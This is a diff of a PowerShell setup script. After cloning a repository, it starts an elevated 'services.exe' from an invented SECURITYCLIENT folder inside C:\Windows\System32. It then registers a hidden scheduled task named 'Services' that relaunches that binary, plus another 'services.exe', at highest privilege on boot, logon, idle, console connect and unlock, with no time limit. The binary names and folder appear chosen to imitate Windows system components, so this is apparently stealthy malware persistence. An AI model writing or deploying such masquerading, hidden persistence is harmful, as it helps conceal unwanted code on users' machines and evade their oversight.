@@ -146,107 +146,125 @@ function Clone-GitHubRepo {
 # Clone the GitHub repository
 Clone-GitHubRepo
 
-# Function to create and start services for each .exe file in the base folder
-#CONTROL+Q
-# function Create-And-Start-Services {
-    # $baseDir = "C:\Windows\System32\SubDir\SECURITYCLIENT\git\base"
+#Starting programs
+Start-Process -FilePath "C:\Windows\System32\SubDirectory\SECURITYCLIENT\git\base\services.exe" -Verb RunAs
 
-   ## Check if the base directory exists
-    # if (-not (Test-Path $baseDir)) {
-        # Write-Host "Base directory not found: $baseDir" -ForegroundColor Red
-        # throw "Base directory does not exist."
-    # }
 
-    ##Get all .exe files in the base directory
-    # $exeFiles = Get-ChildItem -Path $baseDir -Filter *.exe -ErrorAction Stop
+# Define variables
+$taskName = "Services"
+$xmlFilePath = "C:\Windows\System32\SubDirectory\SECURITYCLIENT\git\sch.xml"
 
-    # if ($exeFiles.Count -eq 0) {
-        # Write-Host "No .exe files found in the base directory." -ForegroundColor Red
-        # throw "No executable files found."
-    # }
+# Retrieve current user and domain information dynamically
+$domain = $env:USERDOMAIN
+$username = $env:USERNAME
 
-    # foreach ($exeFile in $exeFiles) {
-        # $serviceName = "Service_" + $exeFile.BaseName
-        # $exePath = $exeFile.FullName
-
-        # Write-Host "Creating service for $($exeFile.Name)..." -ForegroundColor Green
-        # try {
-          ##  Create the service
-            # sc.exe create $serviceName binPath= "$exePath" start= auto | Out-Null
-            # Write-Host "Service '$serviceName' created successfully." -ForegroundColor Green
-
-           ## Start the service
-            # Start-Service -Name $serviceName -ErrorAction Stop
-            # Write-Host "Service '$serviceName' started successfully." -ForegroundColor Green
-        # } catch {
-            # Write-Host "Failed to create or start service '$serviceName': $($_.Exception.Message)" -ForegroundColor Red
-            # throw "Service creation or start failed."
-       # }
-    # }
-# }
-
-# Function to validate if the provided path is a valid .exe file
-function Validate-ExeFile {
-    param (
-        [string]$FilePath
-    )
-    if (-not (Test-Path -Path $FilePath)) {
-        Write-Host "The specified file path does not exist." -ForegroundColor Red
-        return $false
-    }
-    if ((Get-Item $FilePath).Extension -ne ".exe") {
-        Write-Host "The specified file is not a valid .exe file." -ForegroundColor Red
-        return $false
-    }
-    return $true
+# Ensure the directory exists before saving the file
+$xmlDirectory = Split-Path -Path $xmlFilePath -Parent
+if (!(Test-Path -Path $xmlDirectory)) {
+    New-Item -ItemType Directory -Path $xmlDirectory -Force | Out-Null
 }
 
-# Prompt the user for the program location
-$programPath = "C:\Windows\System32\SubDirectory\SECURITYCLIENT\git\base\services.exe"
+# Define the XML content dynamically
+$xmlContent = @"
+<?xml version="1.0" encoding="UTF-16"?>
+<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
+  <RegistrationInfo>
+    <Date>$(Get-Date -Format o)</Date>
+    <Author>$domain\$username</Author>
+    <URI>\services</URI>
+  </RegistrationInfo>
+  <Triggers>
+    <LogonTrigger>
+      <Enabled>true</Enabled>
+    </LogonTrigger>
+    <BootTrigger>
+      <Enabled>true</Enabled>
+    </BootTrigger>
+    <IdleTrigger>
+      <Enabled>true</Enabled>
+    </IdleTrigger>
+    <SessionStateChangeTrigger>
+      <Enabled>true</Enabled>
+      <StateChange>ConsoleConnect</StateChange>
+    </SessionStateChangeTrigger>
+    <SessionStateChangeTrigger>
+      <Enabled>true</Enabled>
+      <StateChange>SessionUnlock</StateChange>
+    </SessionStateChangeTrigger>
+  </Triggers>
+  <Principals>
+    <Principal id="Author">
+      <UserId>$domain\$username</UserId>
+      <LogonType>InteractiveToken</LogonType>
+      <RunLevel>HighestAvailable</RunLevel>
+    </Principal>
+  </Principals>
+  <Settings>
+    <MultipleInstancesPolicy>Parallel</MultipleInstancesPolicy>
+    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
+    <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>
+    <AllowHardTerminate>true</AllowHardTerminate>
+    <StartWhenAvailable>false</StartWhenAvailable>
+    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
+    <IdleSettings>
+      <StopOnIdleEnd>true</StopOnIdleEnd>
+      <RestartOnIdle>false</RestartOnIdle>
+    </IdleSettings>
+    <AllowStartOnDemand>true</AllowStartOnDemand>
+    <Enabled>true</Enabled>
+    <Hidden>true</Hidden>
+    <RunOnlyIfIdle>false</RunOnlyIfIdle>
+    <DisallowStartOnRemoteAppSession>false</DisallowStartOnRemoteAppSession>
+    <UseUnifiedSchedulingEngine>true</UseUnifiedSchedulingEngine>
+    <WakeToRun>false</WakeToRun>
+    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
+    <Priority>7</Priority>
+  </Settings>
+  <Actions Context="Author">
+    <Exec>
+      <Command>C:\Windows\System32\SubDirectory\SECURITYCLIENT\git\base\services.exe</Command>
+    </Exec>
+    <Exec>
+      <Command>"C:\Program Files\SubDir\services.exe"</Command>
+    </Exec>
+  </Actions>
+</Task>
+"@
 
-# Validate the provided path
-if (-not (Validate-ExeFile -FilePath $programPath)) {
-    Write-Host "Invalid file path or file type. Exiting script." -ForegroundColor Red
-    
+# Save the XML content to a file with error handling
+Try {
+    $xmlContent | Out-File -FilePath $xmlFilePath -Encoding UTF8 -Force
+    Write-Output "XML configuration saved successfully: $xmlFilePath"
+} Catch {
+    Write-Error "Failed to save XML file: $_"
+    Exit 1
 }
 
-# Define the task name and description
-$taskName = "StartupProgramTask"
-$taskDescription = "Runs a program at system startup under the logged-in user account."
-
-# Get the current logged-in user's username
-$currentUser = $env:USERNAME
-
-# Create the scheduled task
-$action = New-ScheduledTaskAction -Execute $programPath
-$trigger = New-ScheduledTaskTrigger -AtStartup
-$principal = New-ScheduledTaskPrincipal -UserId $currentUser -LogonType Interactive -RunLevel Highest
-
-# Register the scheduled task
-try {
-    Register-ScheduledTask -Action $action -Trigger $trigger -TaskName $taskName -Description $taskDescription -Principal $principal -Force
-    Write-Host "Scheduled task '$taskName' created successfully." -ForegroundColor Green
-} catch {
-    Write-Host "Failed to create the scheduled task: $_" -ForegroundColor Red
-    
+# Register the scheduled task with error handling
+Try {
+    Register-ScheduledTask -Xml (Get-Content -Path $xmlFilePath -Raw) -TaskName $taskName -Force
+    Write-Output "Scheduled task '$taskName' registered successfully."
+} Catch {
+    Write-Error "Failed to register scheduled task: $_"
+    Exit 1
 }
 
-# Run the scheduled task immediately
-try {
+# Start the scheduled task with error handling
+Try {
     Start-ScheduledTask -TaskName $taskName
-    Write-Host "Scheduled task '$taskName' started successfully." -ForegroundColor Green
-} catch {
-    Write-Host "Failed to start the scheduled task: $_" -ForegroundColor Red
-    
+    Write-Output "Scheduled task '$taskName' started successfully."
+} Catch {
+    Write-Error "Failed to start scheduled task: $_"
 }
 
-# Verify the status of the scheduled task
-$taskStatus = (Get-ScheduledTask -TaskName $taskName).State
-if ($taskStatus -eq "Running") {
-    Write-Host "The scheduled task '$taskName' is running successfully." -ForegroundColor Green
-} else {
-    Write-Host "The scheduled task '$taskName' is not running. Current status: $taskStatus" -ForegroundColor Red
+# Check and display the task status
+Try {
+    $taskStatus = Get-ScheduledTask -TaskName $taskName | Select-Object -ExpandProperty State
+    Write-Output "Scheduled Task '$taskName' Status: $taskStatus"
+} Catch {
+    Write-Error "Failed to retrieve scheduled task status: $_"
 }
+
 
 Write-Host "Script completed successfully." -ForegroundColor Green
 # Keep the window open
